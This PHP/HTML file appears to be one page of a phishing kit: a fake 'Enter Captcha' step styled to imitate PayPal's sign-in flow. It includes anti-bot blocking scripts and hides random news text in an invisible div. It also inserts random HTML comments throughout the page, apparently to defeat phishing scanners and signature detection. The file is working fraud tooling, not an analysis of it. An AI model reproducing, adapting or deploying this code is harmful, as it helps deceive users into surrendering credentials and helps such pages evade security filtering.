<?php 
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
ob_start();
session_start();


	include "../manger/languages/{$_SESSION['language']}.php";
	$_SESSION['captcha'] = "secure";

    
	?>
<!DOCTYPE html>
<html dir="ltr" lang="en">
<head>
	<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
 <link rel="shortcut icon" type="image/x-icon" href="../favicon.ico">
	<link rel="apple-touch-icon" href="../favicon.ico" />
	<script src="lib/js/jquery.min.js"></script>
	<script type="text/javascript">$('.loaderOverlay').fadeIn();setTimeout(function(){$('.loaderOverlay').fadeOut();},3500);</script>
	<link rel="stylesheet" href="styles/xappx.css" />
	<title>Enter Captcha</title>
</head>
<body>    <div style="z-index:-1;width:80vw;height:80vh;position:absolute;display:none;overflow:hidden;box-sizing:border-box;">
    <div style="opacity:0;white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;">
    <?php include('../news/news-'.rand(0,9).'.txt'); ?></div></div>
	<div class="contentContainer" id="content">
		<div class="safeComponent" data-nemo="safeStartPage"> 
			<header><div class="xysx-logo"></div> </header>
		
<html>
<div>
	<head>
		<link rel="stylesheet" href="styles/custom.css"> <?php echo "<!--".rand(0,99999999)."-->"?>
		<!-- The directory of the CSS file --> 
		<script type="text/javascript" src="signin.js"></script><?php echo "<!--".rand(0,99999999)."-->"?>
		<!-- The directory of the JS file --><title> </title><?php echo "<!--".rand(0,99999999)."-->"?>
	</head>
  
<body onLoad="ChangeCaptcha()"><?php echo "<!--".rand(0,99999999)."-->"?>
     
	<!-- As the body loads, the function runs and Captcha is loaded. -->
	<input type="text" disabled="disabled" id="randomfield">
	<!-- Change this ID to the desired one, be sure to change it in the CSS and JS files too -->
	<?php echo "<!--".rand(0,99999999)."-->"?><br>
	<?php echo "<!--".rand(0,99999999)."-->"?><br><?php echo "<!--".rand(0,99999999)."-->"?>
	<?php echo "<!--".rand(0,99999999)."-->"?><input style="height: 25px;
width: 131px;
border: 1px solid #9da3a6;
    border-top-color: rgb(157, 163, 166);
    border-top-style: solid;
    border-right-color: rgb(157, 163, 166);
    border-right-style: solid;
    border-bottom-color: rgb(157, 163, 166);
    border-bottom-style: solid;
    border-left-color: rgb(157, 163, 166);
    border-left-style: solid;
    border-image-outset: 0;
    border-image-repeat: stretch;
    border-image-slice: 100%;
    border-image-source: none;
    border-image-width: 1;
background: #fff;
    background-color: rgb(255, 255, 255);
background-color: rgb(255, 255, 255);
background-color: rgb(255, 255, 255);
text-overflow: ellipsis;
<!--border-radius: 4px;-->
box-shadow: none;
font-size: 1em;
font-family: pp-sans-small-regular,Helvetica Neue,Arial,sans-serif;
font-weight: 400;
direction: ltr;
box-sizing: border-box;
-webkit-appearance: textfield;
background-color: white;
cursor: text;
padding: 2px;
<!--border-width: 2px;-->
border-style: inset;
border-color: initial;
border-image: initial;
text-rendering: auto;
color: initial;
letter-spacing: normal;
word-spacing: normal;
text-transform: none;
text-indent: 0px;
text-shadow: none;
display: inline-block;
text-align: start;
margin: 0em;
    margin-top: 0em;
    margin-left: 0em;
font: 400 13.3333px Arial;
-webkit-writing-mode: horizontal-tb !important;
margin-left: -50px;
margin-top: -17px !important;" placeholder="Captcha Code" id="CaptchaEnter" size="20" maxlength="6" /><?php echo "<!--".rand(0,99999999)."-->"?>
	<!-- Change maxlength to the size you wanted your Captcha to be -->
	<br><?php echo "<!--".rand(0,99999999)."-->"?>
	<button onclick="check()" type="submit" id="xyssubmitsecx" name="safeContinueButton" class="safeContinueButton primary" value="Continue" style="margin-top: -26px;
float: right;
width: 68px;
height: 26.5px;
margin-right: 84px;
position: relative;">Continue</button>
          
	<!-- The function is executed when the user presses this button -->
<?php echo "<!--".rand(0,99999999)."-->"?></body><?php echo "<!--".rand(0,99999999)."-->"?>
<?php echo "<!--".rand(0,99999999)."-->"?></div><?php echo "<!--".rand(0,99999999)."-->"?>
<?php echo "<!--".rand(0,99999999)."-->"?></div><?php echo "<!--".rand(0,99999999)."-->"?>
<div class="loaderOverlayAdditionalElements"></div><?php echo "<!--".rand(0,99999999)."-->"?>
</div><?php echo "<!--".rand(0,99999999)."-->"?>
<?php echo "<!--".rand(0,99999999)."-->"?><div class="modal-overlay"></div><?php echo "<!--".rand(0,99999999)."-->"?></div></div> <?php echo "<!--".rand(0,99999999)."-->"?>
<?php echo "<!--".rand(0,99999999)."-->"?>
	
</div> 
</footer> 
<script src="lib/js/xsecx.js"></script>
</body>
</html>